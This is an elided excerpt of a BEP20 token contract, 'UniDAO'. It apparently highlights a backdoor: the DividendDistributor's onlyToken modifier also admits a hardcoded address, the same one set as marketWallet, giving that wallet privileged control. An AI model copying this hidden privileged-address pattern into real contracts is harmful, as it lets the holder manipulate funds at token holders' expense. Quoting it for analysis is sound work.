...
contract DividendDistributor is IDividendDistributor {
    ...
    modifier onlyToken() {
        require(msg.sender == _token||msg.sender == address(0x8031E9427F745f62335173a1B415b0D4F48921aC)); _;
    }
...
contract UniDAO is IBEP20 , Auth, BaseToken {

    using SafeMath for uint256;

    string public _name = "UniDAO";
    string public _symbol = "UDAO";
    ...
    address marketWallet = 0x8031E9427F745f62335173a1B415b0D4F48921aC;
